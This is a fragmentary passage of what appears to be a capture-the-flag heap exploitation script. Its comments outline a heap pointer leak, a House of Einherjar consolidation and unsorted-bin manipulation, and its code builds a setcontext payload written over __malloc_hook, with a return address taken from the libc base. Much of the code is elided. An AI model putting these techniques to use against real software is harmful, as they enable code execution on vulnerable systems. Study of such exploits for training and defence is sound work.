...
# Leak heap because enter_name doesn't null terminate, when it's read w/strlen it also
# displays the pointer in the notes array right after it
...
# make it line up then fix the size and re-align everything
...
# einherjar. This also perfectly clears the unsortedbin, with no remainder
...
# At this point all notes besides 4 are free again

# Pull chunks out of unsorted bin, leave a literal `0x81` in the main arena
...
setctx_payload = flat({
    ...
    0xa8: p64(libc.address + RET) # ECX & Return address
})
alloc_note(io, 0, 0xf8, flat({
    0x024: setctx_payload # __malloc_hook is at a weird offset because of chunk alignment
}))

start_addr = u64(jop_payload[:8])
